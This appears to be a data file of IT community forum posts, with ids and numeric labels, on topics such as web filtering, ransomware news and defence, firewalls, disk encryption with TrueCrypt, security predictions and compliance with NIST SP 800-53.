558512,web filtering at the router,"I have been looking for a solution for a number of customers that would prevent either users or for that matter malicious software from accessing prohibited URLs.  I am talking relatively small networks so we aren't talking anything  enterprise or the like. So  I am looking at Cisco/Trend Micro Protectlink on the RVO line of routers, and OPENDNS.  We looked at Protectlink for Cisco routers several years ago and it introduced so much latency that we really found it a poor solution. I think I saw some blogs suggesting that since then Cisco/Protectlink had corrected that problem but I am hesitant to jump into something I have had bad experiences with.  OPENDNS looks interesting, but I am a bit confused about how it is licensed and implemented. When you talk to sales reps at OPENDNS you get told about Umbrella, and it sounds like client software loaded on laptops and workstations.  Early on, I thought the way OPENDNS worked was you just pointed to their DNS servers and registered based on your static public IP address. That sounds simple enough, but what is the Umbrella business?  Then too they talk about licensing it based on devices connected to the network, but if the setup is as I described, how do they control access, it is just pointing to a DNS server?  I am open to other solutions that might help here. Oh, and I also have a client that has wide open WIFI and I really believe they should have some sort of filtering in place. ",0

2128501,"4 Password Painpoints: Employee Behavior, Helpdesk Costs, Control, and Auditing","As specialists in password management, here are 4 password pain points we typically see in our deployments.  As the primary attack vector for hackers, the password is frequently the only thing protecting your confidential business plans, IP, employee census information and customer data. Unfortunately, passwords are also the weakest link in security. Verizon found that 81% of cyber breaches are due to weak passwords and poor password management practices. 1) Employee Behavior: Weak passwords and password reuse are major security issues. However, creating and remembering passwords causes frustration and productivity loss.2) Helpdesk Costs: Gartner found up to 50% of helpdesk calls are related to password resets. One study showed the cost of each helpdesk call is $31, potentially costing millions of dollars annually for a single company.3) Role-Based Access Control (RBAC): A critical security concept is that of least privilege. It means that employees should only have enough access to do their jobs and no more.4) Auditing: Another security concept is that how, when, what and who accesses assets must be logged and monitored to identify security issues.Do you have any password pain points in your organization? What are your solutions to eliminate those password pain points? Share your thoughts. ",0

1719202,Locky Ransomware Encrypts Files Even When Machine Is Offline,"The Russian Cyber Mafia behind Dridex and Locky ransomware have added a fallback mechanism in the latest strain of their malware created for situations where their code can't reach its Command & Control server.Researchers from antivirus vendor Avira blogged about this version which starts encrypting files even when it cannot request a unique encryption key from the C&C server because the computer is offline or a firewall blocks outgoing communications.Calling the mothership is normally required for ransomware that uses public key cryptography. And actually, if the code is unable to call home to a C&C server after they infect a new machine, most ransomware does not start the encryption process and is dead in the water.Why? The encryption routine needs unique public-private key pairs that are generated by the C&C server for each infection. How does this work? Here is a simplified sequence of events.The ransomware program generates a local encryption key and uses an algorithm like AES (Advanced Encryption Standard) to encrypt files with certain extensions.It reaches out to a C&C server and asks that machine to generate an RSA key pair for the newly infected system.The public key of that pair is sent back to the infected machine and used to encrypt the AES encryption key from step 1. The private key, (needed to decrypt what the public key encrypted), stays on the C&C server and is the key that you get when you pay the ransom and is used for decryption.As you see, a lot of ransomware  strains are useless if a firewall detects their attempt to call home and blocks it as suspicious. There is another scenario however...As damage control, organizations also cut off a computer from the network the moment a ransomware infection is detected. They might even take the whole network offline until they can investigate if other systems have also been infected. Tough luck if you get infected with this most recent Locky strain, it goes ahead and encrypts file files anyway. The silver lining? If someone pays the ransom and gets the private key, that key will work for all other offline victims as well, so expect a free decryptor to become available in the near future. F-Secure researchers reported on two massive phishing campaigns distributing Locky this week, one of them reaching 120,000 hits per hour, more than 200 times higher than the spam hits on a regular day, they said in a blog post.

1092173,Sonicwall BWM Egress vs Ingress,I am working on configuring our new Sonicwall TZ 215. I would like to utilize the BWM feature. I want to make sure that I configure the available bandwidth on the WAN interfaces correctly. It is asking for Egress and Ingress values in Kbps. I used speedtest.net and got Download speed of 43.31 Mbps and Upload speed of 6.25 MbpsAm I correct in assuming that the download speed which would be 44339 would go into the Egress field and 6400 would go into the Ingress field? Do I have this backward? Thanks for any help you can provide. I am used to the appliance asking for download speed and upload speed on these settings so want to make sure I do this correctly. ,5

301062,Can you explain this firewall/anti-virus behavior?,"Last month I saw a virus laden email hitting our email gateway running Trend Micro IMSS product. This product does have it's own anti-virus capabilities. All incoming mail is from a range of Postini IP addresses and the firewall is secured to only accept SMTP traffic from that range. Theoretically, no email should be passed by the firewall to the internal gateway unless it comes from that range of Postini IP addresses. Also, all SMTP traffic is done using TLS.The first sign of a problem was when I got an email notification from our Trend Micro Office Scan service that reported a virus found on the email gateway server. The offending object was eliminated from the server. I then got the same virus warning email 1 h 8m later. And again...and again...every 1 h 8 min. I wasn't too worried about the email itself since I had alerted the intended recipient not to open anything that came to him and the email itself should've been caught by the email gateway. I tried adding filters to the email gateway server to no avail. I also tried adding a filter with Postini to no avail either. The solitary message kept coming like clockwork and would be deleted like clockwork by Office Scan.I got a bright idea and thought perhaps TLS was interfering with the firewall scanning process since that encrypts email transmission so I turned off TLS when the next message was due and voila, the incoming message stopped. I couldn't tell what caused it to stop but saw that this particular message would have been #25 so I thought perhaps Postini had simply given up trying to deliver that message and NDR'd it after 24 attempts in 24 hours.Fast forward a month and I started to get 3 identical emails again...this time to 3 individuals. Same pattern, same problem. On our email gateway, as mail comes in it is directed into a .tmp folder. Each email is comprised of two files. Both have the same handle but differing extensions of .af and .df. When the email is finished being received the gateway must assemble those two files into the solitary email the user receives. Every time the virus laden email arrived I could see the .af file arrive and then the .df and then immediately the Office Scan product would delete the .df portion and issue a warning. It was obvious that Office Scan was protecting the gateway but the firewall and the gateway software itself were not.So I turned off TLS again right before the next set of messages and sat watching the gateway console. I knew which IP addresses were being used and sure enough I saw the three messages hitting the gateway. I checked the email logs on the gateway and there was no sign of them. It was as if they never hit the gateway at all. No messages were delivered to the intended recipients. They had vanished. I then noticed I had three messages in my firewall alerts folder. In fact, our firewall had blocked each of them. One of the firewall messages is:02/07/2013 13:09:06.128 - Alert - Security Services -  Gateway Anti-Virus Alert: (Cloud Id: 12623873) Tepfer.FGZR (Trojan) blocked -  64.18.1.99, 45695, X1 -  172.31.0.44, 25, X0 -The messages were coming from 64.18.1.99, a legitimate Postini address and headed for 172.31.0.44, my internal email gateway server. It's apparent that TLS was indeed not letting the firewall do its job. I guess that should be expected. As the email was being compiled on the gateway it's own internal A/V product (Office Scan) did its job and captured the offending file so it did it's expected job. What I don't understand is the relationship between the firewall and the gateway server. With TLS off, I could see the email connection hitting the gateway server and I could see the building blocks of the message start to arrive in a folder on the gateway. At some point, though, the firewall apparently determined the arriving message was a virus and killed the whole process.That part I don't understand. I thought the packets would be examined prior to allowing them to pass through to the gateway but that's clearly not the case. Also, the firewall must have communicated something to the computer sending the virus email because it didn't send the messages again like it would when Office Scan quarantined part of the email, thus severing the email connection prematurely and causing the sending computer to retry the send later. Is the process I tried to explain how you understand a firewall to work. Does a firewall typically allow packets to flow to the intended internal target until it finally has enough evidence to halt the packet flow? Did it reply back to the sending computer that email reception was complete (even though it wasn't), thus tricking the sending computer not to retry delivery? ",11
821602,question on on-disk encryption (Seagate),"I'm exploring the possibility of configuring a server with hardware-based encryption on its internal RAID array.  Likely using Seagate drives that support SED plus an Intel RMS25PB080 RAID controller and AXXRPFKDE2 encryption key module.  Server would be running Windows Server 2012 R2 Standard, drives likely configured in a RAID 10 array.I've never used on-disk encryption before.  I have 2 quick questions:1 - With this configuration would the server prompt for a password on boot to bypass the encryption?  My understanding is ""no"".2 - With this configuration would the server be reasonably protected from someone, say, booting up with different boot media in order to bypass the Windows login password and gain access to the data stored on the RAID array?  My understanding is ""yes"".Any help appreciated.﻿Thanks!",5

That was bad enough, but he emailed me, and asked for a time he could call back, so I gave him a time, and he called back THE NEXT DAY, 5 hours after the time I gave him, so of course, I was in a meeting.I got a voicemail from him over the weekend saying that he'd be out of the office this week, and that unless I could wait, I should call in, get the main queue, wait on hold, and then ask for my case to be reassigned, and then wait ANOTHER DAY for someone else to return my call.In the meantime, I haven't had a successful backup in 10 days. What gives!? The biggest issue I have, other than the time it takes for them to respond to critical issues, is that I had to listen to the voicemails 4-5 times each to understand all of what the person was saying. I'm so frustrated with their call center, it makes me furious.Has anyone had good experiences with them? Should I start shopping for replacement?

1365248,"Top 10 Predictions for 2016: Read It, This Is A Good One","  At the end of the year I spend a few days reading all the IT security pundit's 2016 predictions and synthesize them with my own perspective. The Crystal Ball issue is the shortest of the year and takes the longest to write, but it's fun.Most people in this industry are very smart, and sometimes their predictions are outright hilarious. Here is one: ""Toaster DDoS Attack On Coffee Maker Ruins Morning"". Those short 9 words describe a whole world of Internet of Things vulnerabilities in a very funny headline. As usual, I'm donning my asbestos undies, so you can safely flame my poor behind after reading the new 2016 predictions. And again, we go gazing in the crystal for the coming 12 months, but remember, the future ain't what it used to be. It's already here, but unevenly distributed. Good riddance of terrible 2015 which was the year of the data breach.Unfortunately in most respects, 2016 won’t change much: users will still click on malicious links and open infected attachments. IT will still have trouble with patching. The bad guys will still attack and bad news from data breaches will continue. Cyberattacks will become increasingly destructive. What matters most is whether your organization will be a victim or not. Of course you could do nothing, and be lucky. But the only way to control your fate is make your organization a hard target based on a top-down, security-first culture. ﻿To start off, also as usual, I'm repeating the tradition of my same New Year's Wish as a newsletter editor since 1996: ""A world without war, crime and insanity, where honest people can flourish, prosper and reach greater heights"".--------------Here are the Top 10 predictions for 2016 in alphabetical order1) BOARD ROOMBoards of directors will finally appreciate that information security risk management should be treated as an enterprise risk equivalent to financial, reputational, and legal risk. Too often board members see the light only after a data breach. Having understood how security risk impacts the business, in 2016 they will make sure to change corporate culture into the direction of a good security risk management program. Next year will be a very important year for cyberinsurance, boards are going to ask for this. PwC predicts that the cyber insurance market will triple in the next five years and this will force boards to take a long, hard look at the cost of their continued insecurity.2) BUDGET SURVIVAL TIPSThe things that will get approval are projects designed to cut the cost of doing business. Smaller-scale IT security initiatives that have a quick ROI, e.g. new school security awareness training which combines training with simulated phishing attacks, will be popular with management and boards.3) CEO FRAUD aka BUSINESS EMAIL COMPROMISELooking at the rapid uptrend of CEO Fraud over the past year, this will be the new scourge in 2016 following ransomware, hitting consumers, small and medium enterprise and large enterprise with competing cyber mafias specializing in verticals like financial institutions, healthcare and manufacturing.4) INTEGRITY ATTACKSThink Stuxnet for the Financial Industry. The data breach attacks we have seen by the hundreds are loud and obvious. They expose data which causes embarrassment, inconvenience, and financial losses.  Integrity attacks are stealthy, selective, and can be much more devastating. Instead of doing damage or making off with vast amounts of sensitive data, they instead focus on carefully changing particular elements within transactions, communications, or data to gain a significant benefit.In 2016, you will see an integrity attack in the financial sector in which millions of dollars will be stolen by cyber thieves who will modify selected data in the transaction stream, resulting in a significant redirection of payment to anonymized accounts. How they'll get in? Spear phishing.5) INTERNET INFRASTRUCTURE2016 is the year that passwords will start to disappear. Biometrics like voice and face recognition go mainstream and 2-factor tech like authentication code generators on mobile phones will spread exponentially. For your own infrastructure, look at containers that host similar 2FA micro-services that you can integrate in your own apps. Nation-states will continue battling for the domination of Internet backbone and infrastructure components.6) INTERNET OF THINGS6.4 billion connected “things"" will be in use globally by the end of 2016, but IoT standards related to security are a hodge-podge. There are literally hundreds of standards that potentially touch IoT and precious few that directly accommodate IoT. It's early days and there is no consensus. As long as vendors' #1 concern is ""time to market"" and not ""security by design"" you will see a flurry of attacks on IoT devices like Talking Barbie and others. Cutting edge criminal hackers will create the very first BoT - Botnet of Things. Don't leave any kind of Wi-Fi enabled devices or toys in the master bedroom! 7) MALICIOUS E-COMMERCE GOES SOCIALMany traditional social networking sites such as Pinterest, Facebook and Twitter will add “buy” buttons to their platforms in an effort to increase stickiness with their users and help monetize their user base. It's going to be heaven for cyber criminals who will social engineer themselves into millions.8) MOBILE MALWAREMobile malware, specifically mobile banking Trojans, are on a trajectory to become much more prevalent for banks and financial institutions in 2016. There will be an increase in malware families that are gaining root access rights on users' devices. These attacks will pose a significant problem for many financial institutions, who have thus far mostly ignored the threats mobile devices pose. Commercial malware authors will continue to reinvest at ever greater rates, bringing them towards the ""spending power"" of nation-state activity. This includes purchasing zero days. The bad guys have lots of cash and they are smart investors.9) RANSOMWAREA ransomware crime wave will surge across America.The use of Cryptowall 4.0 will explode, and Cryptowall V5.0 will add an actually working ""feature"" that TeslaCrypt only threatened with: extortion by potentially publishing private personal or business files on the Internet.Cyber mafias will focus on professional services firms and local government using Cryptowall as their tool and extort tens of thousands of dollars from organizations that don't want their business disrupted or their intellectual property compromised.Cryptowall will be the first strain of ransomware to hit the billion dollar in damages.Ransomware is the new APT: ""Annoying Persistent Threat"", as it will be increasingly used in double payload attacks combined with other scams.Ransomware attacks doubled in 2015 and will double again in 2016. The U.K. is to some extent a bell-weather for the U.S. as they function as a beta test site for Eastern European cyber mafias who can test malicious code in their own time zone. Well, over half (54%) of all malware targeting UK users in 2015 contained some form of ransomware. Buckle up.Ransomware-as-a-service hosted on the TOR network and using Bitcoin for ransom payment enables a new generation of cybercrime newbies to make their mark.A new sleeper ransomware variant will start to stealthily encrypt data, pull your critical files onto a C&C Server, and wait until a backup been made. At that point they will yank the encryption key and demand a much larger amount of ransom than the current 500 bucks.10) SOCIAL ENGINEERINGIDG asked hundreds of high-level InfoSec pros the following question: ""What will be the single biggest security threat of 2016?"" The number one answer was: ""people"". With events like the presidential election drumming up a frenzy of social media activity in 2016, you can expect attackers to use the attention given to political campaigns, platforms and candidates as an opportunity to tailor social engineering lures.To quote Corey Nachreiner, CTO of WatchGuard: ""The single biggest threat you’ll face in 2016 is your own people."" Check out their video and recommendation. Could not have said it any better myself: ﻿https://www.youtube.com/watch?v=4rJdYBcvxqs-------WILD-ASS Guesses For 2016:Disabled murder suspect claims his exoskeleton was hacked and he didn't do it.In the next 12 months we will see a new cyber-insurance offering with the marketing slogan ""for cybercrime by cybercrime"". Bad guys need insurance too.The iPhone 7 and 7 Plus which are expected in September will be delayed because of an NSA-compromised supply chain partner which enables Apple encryption to be hacked.Microsoft's Cortana turns out to have been penetrated and it is social engineering users to give it credit card numbers and passing these off to criminals.For a change, Tesla's Model 3 is on time and will cost 34,900 dollars for a 300-mile range electric vehicle. They will get hundreds of thousands of people ordering one and Tesla will be overwhomped.In 2016 it will be found that both fantasy sport sites DraftKings and FanDuel were hacked in 2015 and have been penetrated for more than 9 months. All personal and credit card data is sold in the undergroun economy and will be used for highly personalized spear-phishing attacks.A developer in India making 20K a year will build a zero-day vulnerability in the code of a mainstream U.S. app and share the 6-figure bug bounty with his pal who will claim it.The combination iPhone and iWatch will be compromised and you are forced to use Apple's iPay to make the ransom payment.

Most wearables which collect personal information lack even basic security features.The 2015 car-hacking exploits were only the beginning. The attack surface of cars is ginormous and you will see this used by cybercrime in 2016 - paying a micro-ransom to get into you car is not too far off.Ransomware gets bundled with worm-like malware to ""brick"" all the Windows endpoints and servers of a targeted organization. Cybercriminals will use this technique on a large scale, demanding millions in Bitcoins from their victims and may even offer innovative payment terms with protection terms.Either the NSA, Google or China will have a breakthrough in Quantum Computing which will make any kind of encryption useless. By the way this superpower race for a working quantum computer is as critical for cyber security as the race for atomic weapons in WWII.A popular website will be breached for the sole purpose of a fully automated mass personalized extortion scheme - pay in Bitcoin or your highly personal, sensitive information will be sent to your family and friends.﻿",11

798638,Firewall or not to firewall? Lan with database application,"I am interested in the communites views/experiences so please read to the end.In the good olde days? security was down to you. Everything was open by default and you shutdown, locked out or did what ever you thought prudent for your enviroment to make it ""secure"".Fast forward to the present and pretty much most things have been reversed. Everything locked down or turned off and you open or enable only what is needed in your enviroment to allow it to work or you ignore the consensus and open up everything based on your exceptance of risk.So, like most IT people (I suspect) we enable the windows firewall (or alternatives dependant on the clients needs) on local computers opening the relevant ports or allowing through only what is needed. This action based mainly on reports from leading organisations (Forrester) indicating internal risk being higher or the very least as high as that from external sources. So when a client asked us to contact a 3rd party database application company, supplying a new app for our client, and discuss security we were a little taken a back when they told us ALL internal firewall applications MUST be turned off. When we querried this statement they told us the are not necessary as nothing, accept the router had an internet facing connection? Now we know that firewalls add small amounts of latency to netowrk traffic and whilst small can have the potential to be cummalitive to the point it can impact on DB performance but alarm bells stared ringing. Was the 3rd parties statement that all internal firewalls be turned off an indication of poor software design? They further backed up their statement with another worrying sentance that firewalls have casused them no end of problems in the past :(So that was the background to why I have posted (and eventually) asking Are others enabling firewalls on client PC's in netowrked environmentsDo you have first hand experience of firewalls and network DB's, particularly, in your experience what is the performance hit if anywould you suspect poor software design a more likely reason for turning off firewallsMany thanks  ",0

First thing in the morning, he hits his favorite site and starts enough downloads that he maxxes the number of concurrent downloads in Chrome. He then carries on with his day. He generally occupies something like 75-80% of our daily bandwidth.The owner has made a zero tolerance rule for porn with instant firing, but at the end of the day, it's family, and they are all shareholders to some degree, so he can't be fired. I've been getting more aggressive with it lately and each time I go down to his computer, I'm finding downloads, so I cancel all downloads, clean up his downloads folder and empty his trash. I also leave a note: ""I don't care if you do this on your own time, but *don't do it at work*!""Each time this happens, he is emboldened because I have authority to do whatever I want to his computer, but his position in the company is solid.

1545659,Detecting encrpyting ransomware on your network & defence in depth,"    The following blog article from Jean-Noël Hass, Director or Research at IS Decisions, provides an overview of best practice in usage as well as a practical test encryption, including the result to show how a file access monitoring solution can help detect massive file encryption on your file servers. The sooner you detect an attack the sooner you will be able to stop it, which means less data loss and less work to clear up the mess! http://www.isdecisions.com/blog/it-security/how-to-detect-ransomware-with-fileaudit/Defence in depthSo how can we protect against such a threat? There are a number of practical measures:1. Clearly, you should educate your users to not open strange email attachments!2. You can disallow files with certain extensions in mail attachments (e.g. executable files, type of files unneeded in your business)3. You should ensure that the programs which are allowed to open attachments are up to date, e.g. if run the latest versions of Microsoft Word or Acrobat Reader4. Normal users should be disallowed from being able to execute programs from locations they are allowed to write to (e.g. their document folders). They should only be able to launch programs approved by the administrator. In Windows, this can be implemented with AppLocker.5. An administrator account should never be used to do basic user tasks such as read email, surf on the internet or do normal office work6. Users should only be able to modify files needed to do their work. Files they have no reason to modify should be restricted to ‘read only’ access for them.7. You should have up to date anti-virus software running on your mail server and on workstations to detect infections and protect against them.8. You should have a way to detect massive file encryption on your file servers. The sooner you detect an attack the sooner you will be able to stop it, which means less data loss and less work to clear up the mess! This is where FileAudit can help you, in configuring mass alerts9. You should have a backup of all your files in a secure place.﻿Read more : http://www.isdecisions.com/blog/it-security/how-to-detect-ransomware-with-fileaudit/﻿",0

But I have a server that I can save that to and I don't want to have to burn a CD every single time. I will burn the CD once I need it from the Server. Here are a few things that I have tried see below: c:\program files\truecrypt\TrueCrypt Format.exe/noisocheckor c:\program files\truecrypt\TrueCrypt Format.exe/n Those two options do not seem to be working: DID I miss understand how to do this? I found those here:http://blog.wisefaq.com/2010/04/07/bypassing-the-truecrypt-rescue-disk-check-requirement/http://superuser.com/questions/93486/truecrypt-encrypt-entire-drive-without-having-a-cd-dvd-drive Thanks,Mike Truecrypt is a wonderful utility many of us use for simple volumes, and storing sensitive data.I have been successfully using the whole disk encryption utility over the last year. Users have not complained about the extra password and I have gotten better sleep knowing the laptops have an extra layer of protection.This how-to will walk you through encrypting the entire disk, including the OS on a laptop. It is a simple procedure and does not hinder the speed of the laptop enough to be noticeable for business users.1.PrerequisitsYou will need a CD-Burner attached to the computer or a built in one.You will need one blank CD.You will need admin rights on the account running the encryption.The procedure will take about 2 hours depending on the size of the disk.2.Install Truecrypt1. If you haven't downloaded it, you can get it here:http://www.truecrypt.org/downloads2. Install Truecrypt to the local drive, accept defaults.3.Encrypt System Drive1. Launch Truecrypt2. System->Encrypt System Drive3. Normal (unless you are paranoid)4. Encrypt Whole Drive.5. Yes, Encrypt Host Protected Area6. Select the appropriate one here, I do single boot.7. AES is what I choose, you can choose your favorite here.8. Use a complicated password, I would suggest 9 characters and make it different for each user, store this password somewhere. Different passwords are suggested for each user because if you fire someone or someone leaves you dont want to have to change the password on every device.9. Move your mouse for a good 20 seconds or so to get a random pool.10. Create Rescue Disk, this is where you need a CD burner.11. Burn the iso for verification (I really really hate this step with Roxio I would say about 1:5 disks get verified when using a separate machine. It should be good enough to verify the iso, in fact even as I write this how-to I have gone through 4 disks before using dvddecryptor to do it instead.)12. After verifying the CD you need to select which wipe mode you want to use, I usually do none as the machines are new when I encrypt them, if you have an existing machine, I would suggest 3 pass.13. Now you need to test, this will reboot your machine. You will be presented with a black screen, enter the password in here that you created in step 8.14. Log into Windows and let truecrypt run, if it doesn't auto launch, just launch it and it will ask you if you want to encrypt the disk.15. This will take a while, you can work on the machine while it is encrypting, it will just be a little slow.4.Finishing touchesNow that the drive is encrypted we want to make sure that the laptop takes advantage of this.You will want to use Hibernation (if you can). Hibernation will actually require the PC to boot vs suspend. This will access the boot loader which is now truecrypt's boot loader, so a user will need to type in the truecrypt password to get back into the laptop.Change your Power settings in control panel to hibernate at an appropriate time and when the laptop lid is closed.ConclusionThis method will add another layer, it is useful for users who have offline files and sensitive data. You will also want to train your users to shutdown when they are not using their computers if hibernation is not an option.",0

We just need to manage the Internet resource as responsibly as we can. From your experience, any suggestions for gateway solutions whether it be turn-key boxes or a software package?",5

256307,Open Letter to CIPAFilter,"Dear CipaFilter,I love working with every technology software and hardware item that I have ever come across, from command line to Apple-like friendly... except the CIPAFilter.To put things into perspective, the CIPAFilter is a very powerful device, and is a rock solid product as it performs the advertized functions. Yet after two months struggling to use the CIPAFilter, thinking that me, the user was slow to learn or comprehend, it was not until today that I really examined why I struggle with it.The reasons why have nothing to do with the power and performance, but everything to do with how the GUI interfaces with the user and certain easy to repair issues.1) You cannot set a specific rule to expire after a set amount of time. A selector for the rule to disable itself or delete itself is needed upon expiration.2) I have 77 Statefull Firewall rules, and they are not sortable so you can compare by title, protocol, or port. You should be able to have a priority level set that is then by default, sorted that way, yet otherwise sortable, even if it is in a reports menu.3) Each rule is 7 lines of text tall, making my 77 rules over 7 pages of scrolling, which are non sortable.4) When 7 pages down, the column category names are 7 pages up, so if you are trying to be super careful, you scroll up and down a lot to double check that you are inserting the proper variable into the proper field.5) To make a rule non-editable, you must click another rule, refresh the page, or save the page to make that first clicked-on rule un-editable. It is so easy to make mistakes this way as you are tempted to close the rule with the red X. (See #8 below)6) When you click on a rule intentionally or accidentally, the GUI changes drastically... then allows modification. I want all fields modifiable on the entire page, maybe changed items highlighted in light red so they can be tripple checked, then I can save.7) If you make a change to a rule, then scroll down, make another change to another rule, there is no visual confirmation of which change was made on which rule made elsewhere before you save at the bottom. One rule at a time then save folks.8) The red X that appears after clicking a rule, deletes the rule with absolutely no confirmation... (the red X in Windows, MacOS, and Linux CLOSES, not deletes)9) No IP-MAC association comparison (that I have seen). I want to know who is attempting to connect.10) I want rules with date stamps on their creation so I can see if a rule can be tied to an issue. (Naming the rule with creation date and time has become my standard operating procedure, albeit a chore.)I believe the CIPAFilter is actually very dangerous as I am unable to sort and compare my new rules with the previous administrator's rules, to check for conflicting, possibly dangerous, or mistakenly made rules. I want all rules sorted together, so I see similar sorted rules together on one page to compare and analyze for dangers.In CIPAFilter's attempt to be ""Web 2.0"", they have broken the user interface, and this they do in a ""Web 3.0"" world. (I do not like the terms ""Web 2.0/3.0"", but I do not know how else to explain my point clearly.)I do not believe we should have to struggle to use our devices these days, this is a highly modifiable WebGUI we are talking about, and web GUI design experts are coming out of colleges like rain falling in the Amazon. One person could remedy all these issues in under a month of programming. My staff programmer is only in his second year of college, and I am confidant he and I could fix CIPAFilter in under two weeks.CIPAFilter, please fix your GUI.In honest, hopeful, and humble sincerity,Steve QuallsTechnology DirectorChadwick School District",11
1238290,Apple's OS X Security Honeymoon Is Over,"Unfortunately, bad guys are business people too. Their time is money, and they follow market leaders. By now, Apple's market share of desktop computers is close to 17 percent. OS X, Apple's operating system, is popular with consumers and enterprises, making it a more interesting target for hackers since it has not been ""mined"" a lot, and Apple users are under the false impression that their platform is ""safe and does not even need antivirus"".Well, a report that was released today by security company Bit9 shows that more malware has been found this year for OS X than in the last five years combined.  The company found 948 unique samples of malware this year compared to 180 between 2010 and last year. The malware is not yet super sophisticated, and is not hard to remove, but the increase is massive and much more than the increase in Windows Malware.Still, it's early days yet compared with the firehose of Windows based malware which is around 400,000 new strains per day at the moment. However, an interesting fact about OS X this year is that many more software vulnerabilities have been disclosed than in past years. A list shows 276 flaws have been found this year, which is about four times higher than the average number found annually over the last 15 years. It looks like more and more researchers are focused on how to bypass OS X security mechanisms or how to get code to execute remotely. There is more detail in an article over at ComputerWorld by Jeremy Kirk.From the perspective of security awareness training, Apple users need to be trained just as much as Windows users. More than half of the Apple malware found this year was aimed at forcing people to view advertisements, a class of annoyances known as adware. Also, infections were mostly dependent on social engineering end-users, like downloading what should be recognized as dodgy software.It is loud and clear that effective security awareness training is a must for all employees, regardless their computer, Windows or Apple OS X. Hundreds of Spiceheads use it to prevent infections and protect their networks. Find out how affordable that is for your organization and be pleasantly surprised.﻿",11
336949,New versatile and remote-controlled “Android.MouaBot” malware found in the wild,"Recently, we discovered a new malicious Android application called Android.MouaBot. This malicious software is a bot contained within another basic app; in this case, a Chinese calculator application. Behind the scenes, it automatically sends an SMS message to an auto-reply number which replies back to the phone with a set of commands/keywords. This message is then parsed and the various plugins within the malicious packages are run or enabled.To find out how to contact the auto-reply numbers, there are two files within the app listing a few URLs which, when visited, display a single line referring the app to another IP address. These IPs are then used to send configuration information down to the app.Read full discovery here ",5

As the wifi access will be provided by a Govt organisation they may want to prevent users accessing unsavoury material. Is there a way to filter content (in the cloud) without installing a firewall at each location as some sites will be just a single WAP and adding a firewall would make it expensive.

2179631,Who is Looking After Your Corporate Learner’s Data Privacy?,"Did you read the end-user terms and conditions of say the new music app you just downloaded? Probably not. Let’s face it, who has the time?  However, Finn Myrstad, a member of the Norwegian Consumer Council, has. He read the full terms and conditions associated with many popular apps and with all the legalese it took him a day and a half  to get through them. No one has that sort of free time, and since they are so ubiquitous, generally most of us tick the box to accept terms without understanding what they mean or the implications regarding the uses of our data.The fact is that most popular apps and websites count on us not reading the end-user agreement. They know that if we did read the contract, it’s unlikely we’d sign and relinquish so readily our rights.  Our internet-dependent society lulls us into a false sense of security because of how friendly the user interface (UI) appears, how benign our interactions appear on the surface.  We don’t anticipate or give any consideration to all the potential misuses of our data.  Where could it be sold, what third-parties can access it and how these abuses can limit our liberties? Perhaps unconsciously, but we surrender more in those few seconds than we would consciously consider doing in a lifetime.Why failing to read the terms and conditions is a problem.For starters, on a personal level if someone has access to your browser history, they can use it to determine if you are eligible for a home mortgage, and depending on the answer, exploit this information by sharing it with mortgage brokers and banks.  Data from a health and fitness app might influence your ability to secure health insurance, or at the very least raise your premium.Now put this into a professional setting. Jim is a successful sales professional with aspirations to manage a sales team for his employer, a tech company. To develop his skills and prepare for such a role, Jim completes several sales leadership courses on his company’s learning portal.  This learning portal also has professional networking features that are well utilized by Jim and his colleagues. Soon Jim begins to receive notifications and emails about sales leadership roles. While this is perhaps a good thing for Jim, for his employer the problem is that these positions are at other companies. By consuming learning on a networking platform that feeds recruiters with insights about its members, Jim is now visible to recruiters and at risk of being poached. Suddenly Jim has the opportunity he wants without having to look for it. While this is beneficial to Jim, for his employer it’s terrible news. In today’s current job market, it is harder than ever to attract and hire top talent with U.S. unemployment at 3.7%, a historic low, and a rate some would consider full employment. The majority of CHROs say that the competition for critical talent will increase over the next 12 monthsWhile employees are entitled to switch employers, they are also entitled to privacy. When Jim is taking courses offered by his company, he should expect to have some authority over this data.  By prioritizing employee or learner privacy, companies both protect and safeguard their employees and build company loyalty.Do you believe that learners are entitled to know that all data around their learning - from which courses they took, completed, assessments they failed and passed - are protected? Why or why not?",0

Suddenly, a voice calls out to you out of nowhere. You look around, but you don't see anyone. Upon further inspection, you notice that the man on the other end is talking to you through your Nest security camera — that he somehow has access to. But luckily, the strange voice just wants to warn you to change your password, and nothing else. This exact scenario happened to Andy Gregg, a man in Phoenix, Arizona, who captured the conversation on video.According to USA Today: ""The man speaking to him through the camera said he was a 'white hat' hacker in Canada with the group Anonymous. He told Gregg his private information had been compromised … The man then recited a password Gregg had used for multiple websites. ""The hacker said he had accessed Gregg's camera to warn him about its security vulnerabilities. Other hackers, he said, might exploit the same gaps for nefarious ends.""True, the hacker was a bit creepy. But at least he had Andy's best intentions in mind. In the video below, the white hat can be heard saying, ""I'm sorry I freaked you out. You'll never see or hear from me again, so have a good night and I hope all is well and I didn't cause too much of a pain in the butt.""Watch the video, and check out the full story on USA Today.https://www.youtube.com/watch?v=xbk3OdYBLHA",0
893504,Required Security Controls from a Customer per NIST SP 800-53,"We have a customer that is asking a company under our corporate umbrella to accept DFARS Clause 252.204-7012 on the safeguarding of unclassified controlled technical information, which requires you to have several security controls in place from NIST SP 800-53 at a minimum.This customer has had some fairly stringent security requirements in the past (i.e. we are on a site-to-site vpn with them so we can access a specific area of their portal to retrieve drawings, etc.), but I have not see anything like this.  I am still working through the list and see that we do have some of the controls in place (whether formally or in procedure but not documented) but will likely fall short in a number of areas.At your company, what has been the reaction when a customer / vendor presses these kind of security requirements upon you and your environment was not ready to support it?  Did they give your company some time to put the necessary controls in place (i.e. develop some kind of get well plan)?Let me also say this is not a list of requirements we were supposed to be meeting all along but some that flowed down from the customer to us just the other day.  They are asking about our ability to accept the clause without an impact to some of the current work we are doing for them.  I guess we will see how that conversation goes after I finish compiling the list of controls and whether we have them in place to discuss with management.Any feedback folks may have about your experience with putting the controls from this clause in place would be most helpful.This was somewhat helpful (http://community.spiceworks.com/topic/118876-active-directory-reporting-nist-sp-800-53-rev-3-complia...),but I'm still looking for other experiences from fellow Spiceheads.﻿",0

